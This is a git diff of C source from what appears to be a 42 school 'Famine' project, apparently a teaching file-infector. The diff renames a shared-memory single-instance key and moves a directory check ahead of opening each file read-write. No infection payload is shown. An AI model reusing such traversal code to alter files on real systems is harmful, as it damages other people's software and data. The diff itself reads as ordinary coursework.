@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
-/*   Updated: 2024/08/02 05:54:49 by mgama            ###   ########.fr       */
+/*   Updated: 2024/08/02 17:16:51 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -67,16 +67,16 @@ void cut_last_line(int text_length)
 
 void remove_shm(void)
 {
-	shmctl(shmget(SHM_KEY, sizeof(int), 0666), IPC_RMID, NULL);
+	shmctl(shmget(FM_SHM_KEY, sizeof(int), 0666), IPC_RMID, NULL);
 }
 
 int is_running(void)
 {
 	/**
-	 * Try to create a shared memory segment with the key SHM_KEY, if it fails
+	 * Try to create a shared memory segment with the key FM_SHM_KEY, if it fails
 	 * this means that the program is already running.
 	 */
-	int shmid = shmget(SHM_KEY, sizeof(int), IPC_CREAT | IPC_EXCL | 0666);
+	int shmid = shmget(FM_SHM_KEY, sizeof(int), IPC_CREAT | IPC_EXCL | 0666);
 	if (shmid == -1) {
 		return 1;
 	}
@@ -129,14 +129,6 @@ void famine(char *target, char *parent)
 	}
 	strcat(full_path, target);
 
-	ft_verbose("%d: Checking %s%s%s\n", count, B_YELLOW, full_path, RESET);
-	count++;
-
-#ifdef __APPLE__
-	if (is_icloud_file(full_path))
-		return ;
-#endif /* __APPLE__ */
-
 	if (lstat(full_path, &statbuf) == -1)
 		return ;
 
@@ -145,6 +137,17 @@ void famine(char *target, char *parent)
 	 */
 	if (S_ISLNK(statbuf.st_mode))
 		return ;
+
+	if (S_ISDIR(statbuf.st_mode))
+		return ;
+
+	ft_verbose("%d: Checking %s%s%s\n", count, B_YELLOW, full_path, RESET);
+	count++;
+
+#ifdef __APPLE__
+	if (is_icloud_file(full_path))
+		return ;
+#endif /* __APPLE__ */
 
 	int fd = open(full_path, O_RDWR);
 	if (fd == -1) {
